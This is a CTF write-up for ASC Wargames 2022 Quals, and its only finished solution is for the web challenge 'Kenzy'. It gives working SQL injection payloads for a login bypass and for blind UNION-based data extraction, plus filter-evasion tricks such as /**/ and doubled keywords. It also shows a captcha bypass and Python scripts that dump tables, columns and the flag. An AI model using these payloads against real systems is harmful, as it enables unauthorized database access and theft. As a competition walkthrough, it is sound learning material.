# ASC Wargames 2022 Quals

A CTF Organized by Arab Security Consultants - ASC. This is a qualification phase for the finals which will be held in Egypt. Top 10 teams are qualified to play in the finals.

I played as a member of Soteria Team & together, we secured the first place in this CTF, out of more than 700 teams.

This time, I played a couple of easy Cryptography challenges, Reverse Engineering & Web.

------------

- [Reverse](#Reverse)
    -  [Unpacking 101 - Easy](#rev1 "Writeup")
	-  [PE Anatomy - Medium](#rev2 "Writeup")

- [Web](#web)
	-  [Kenzy - Hard](#web1 "Writeup")

------------

### Reverse
1. <p name="rev1">Unpacking 101 - Easy</p>
WIP

<br />

2. <p name="rev2">PE Anatomy - Medium</p>
WIP

<br/>

### Web
1. <p name="web1">Kenzy - Hard</p>
We were given the following website:

<p align="center">
    <img width="70%" src='/2022/ASC%20Wargames%202022%20Quals/img/web_home.png'>
</p>

Providing a random password for the admin gives the following:

```
{"Username":"admin","status":"Invalid username or password"}
```

So as a start, we go for a basic SQL Injection. We use `admin' #` for the username & provide anything for the password field to bypass fields verification. We get a successful login:

<p align="center">
    <img src='/2022/ASC%20Wargames%202022%20Quals/img/web_login.png'>
</p>

So, there is something hidden somewhere in the database... Even the home page after logging in doesn't have any kind of access verification & we are simply being redirected to a file `kenzy_admin-panel.php`. We can use this as an oracle to extract information from the database.

Now we have the following problems:
- What do we extract?
- SQLMap isn't useable due to the captcha. (I learnt later on that it's possible to use pre-process, could've been easier.)

Going back to the challenge description, it mentioned a weak captcha so we might be able to bypass it & automate the extraction process.

We download a captcha picture ([Ref](/2022/ASC%20Wargames%202022%20Quals/sources/captcha.php.jpeg)) & we check the content of it, starting with `strings`:

<p align="center">
    <img width='70%' src='/2022/ASC%20Wargames%202022%20Quals/img/captcha_str.png'>
</p>

We see a double base-64 encoded string at the end of the file, decoding it gives us the captcha key.

With this in our hand, we can write a script to get the captcha value then send an SQL injection payload:

```python
import requests

def sendPayload(username, password):
    with requests.Session() as sess:
        resp = sess.get('http://34.175.249.72:60001/scripts/captcha.php')
        captcha = resp.content[-13:-1]
        captcha = base64.b64decode(base64.b64decode(captcha))
        
        resp = sess.post(
            "http://34.175.249.72:60001/index.php",
            data={
                "username":username,
                "password":password,
                "captcha":captcha,
                "send":"Send"
            }
        )
        if b"Invalid username or password" in resp.content:
            return 0
        
        if b"Treasures are always in the database" in resp.content:
            return 1
        
        print(resp.content)
        return 2
```

Now, we can automate! As a start, we can use the `SELECT FROM UNION SELECT` syntax to help us in querying the database, but before that, we need to determin the number of columns the first query is selecting in order to make an `UNION`. To determin that, we can use the following script:

```python
for i in range(1, 50):
    args = ['NULL' for i in range(i)]
    args = ','.join(args)
    if sendPayload("'OR 1=1 UNION SELECT "+args+" #", 'd') == 1:
        print(i)
        break
```

Running this will result in getting a `statement error`. In the error, we can see that:

* Spaces are removed from our input.
* `OR` is being removed. (Later on, we'll figure out that `AND` is being removed too.)

To bypass this, we can simply use `/**/` to replace space & `OOR` and `AANDND` to bypass the keywords filter (Luckly they are replaced only once).

We update our `sendPayload` code to the following:

```python
def sendPayload(username, password):
    username = username.replace(' ', '/**/').replace('OR', 'OORR').replace('or', 'oorr').replace('AND', 'AANDND').replace('and', 'anandd')
    
    with requests.Session() as sess:
        resp = sess.get('http://34.175.249.72:60001/scripts/captcha.php')
        captcha = resp.content[-13:-1]
        captcha = base64.b64decode(base64.b64decode(captcha))
        
        resp = sess.post(
            "http://34.175.249.72:60001/index.php",
            data={
                "username":username,
                "password":password,
                "captcha":captcha,
                "send":"Send"
            }
        )
        if b"Invalid username or password" in resp.content:
            return 0
        
        if b"Treasures are always in the database" in resp.content:
            return 1
        
        if b"statement error" in resp.content:
            print(resp.content)
            return 2
```

And now, we can run our queries without worrying about filters. Re-running the following code to get the number of columns being queried:

```python
for i in range(1, 50):
    args = ['NULL' for i in range(i)]
    args = ','.join(args)
    if sendPayload("'OR 1=1 UNION SELECT "+args+" #", 'd') == 1:
        print(i)
        break
```

Gives us 5.

Now it's time to dump the tables! I wrote a simple script to find all the names of the tables:

```python
tables = [''] # Incomplete table names
total = []  # Complete table names

# Find the possible characters that can be added to the table name tables[0]. If no new characters were found, means the name is complete & can be inserted in total else update tables list.
while len(tables) != 0:
    table = tables[0]
    possibles = []
    for c in "azertyuiopmlkjhgfdsqwxcvbn.,0123456789":
        if 1 == sendPayload("' UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables where table_name like '"+table+c+"%' LIMIT 1#", 'd'):
            possibles.append(c)
    if len(possibles) != 1:
        del tables[0]
        for poss in possibles:
            tables.append(table+poss)
        if len(possibles) == 0:
            total.append(table)
    else:
        tables[0] = table + possibles[0]
    
    print('tables:', tables)
    print('total:', total)
```

This took a while to run since it's dumping everything. When it's done, we got the following list:

```python
['accounts', 'users', 'objects', 'keyring', 'waits', 'x', 'binary', 'error', 'events', 'engine', 'replication', 'role', 'rwlock', 'io', 'innodb', 'password', 'plugin', 'ps', 'sys', 'schema', 'data', 'default', 'db', 'func', 'file', 'general', 'gtid', 'global', 'help', 'hosts', 'latest', 'log', 'mutex', 'component', 'columns', 'cond', 'variables', 'version', 'performance', 'persisted', 'prepared', 'servers', 'setup', 'session', 'statements', 'status', 'solve', 'socket', 'slave', 'slow', 'memory', 'proxies', 'metadata', 'metrics', 'processlist', 'procs']
```

A lot of configuration tables... We can ignore those. What's interesting are these tables:

```python
['accounts', 'users', 'log', 'solve']
```

I thought if nothing worked, we might find something in the logs.

Now, I edited that script to dump the columns of a specified table. 

```python
cols = ['']
total_cols = []
table_name = ''
while len(tables) != 0:
    col = cols[0]
    possibles = []
    for c in "azertyuiopmlkjhgfdsqwxcvbn.,0123456789":
        if 1 == sendPayload("' UNION SELECT column_name, NULL, NULL, NULL, NULL FROM information_schema.columns where table_name='"+table_name+"' and column_name like '"+col+c+"%' LIMIT 1#", 'd'):
            possibles.append(c)
    if len(possibles) != 1:
        del cols[0]
        for poss in possibles:
            cols.append(col+poss)
        if len(possibles) == 0:
            total_cols.append(col)
    else:
        cols[0] = col + possibles[0]
    
    print(cols)
    print('total', total_cols)
```

Going through the tables we had above, we get the following:

* accounts: 'total', 'user', 'host', 'current'
* users: 'email', 'total', 'username', 'password', 'position', 'current', 'company'
* solve: 'flag'

It's clear where we'll be heading now, We dump the solve table.

We can make use of the ascii function to avoid lower/upper case problems. Also it helped me to find some symbols being used in the flag.

Code:

```python
rows = [""]
total_rows = []

while len(rows) != 0:
    row = rows[0]
    possibles = []
    for c in "$#_{-}?!:;-*/+@AZERTYUIOPMLKJHGFDSQWXCVBNazertyuiopmlkjhgfdsqwxcvbn0123456789.,":
        if 1 == sendPayload("' UNION SELECT flag, NULL, NULL, NULL, NULL FROM solve where ASCII(substr(flag,"+str(1+len(rows[0]))+",1)) = ascii('"+c+"') LIMIT 1#", 'd'):
            possibles.append(c)
            break # Only 1 row so don't bother
    
    if len(possibles) != 1:
        del rows[0]
        for poss in possibles:
            rows.append(row+poss)
        if len(possibles) == 0:
            total_rows.append(row)
    else:
        rows[0] = row + possibles[0]
    
    print('rows:', rows)
    print('total:', total_rows)
```

And this gives us: `ASCWG{23fsdc$@#EAScasq12_hard}`

The full script used can be found [here](/2022/ASC%20Wargames%202022%20Quals/sources/solver.py)
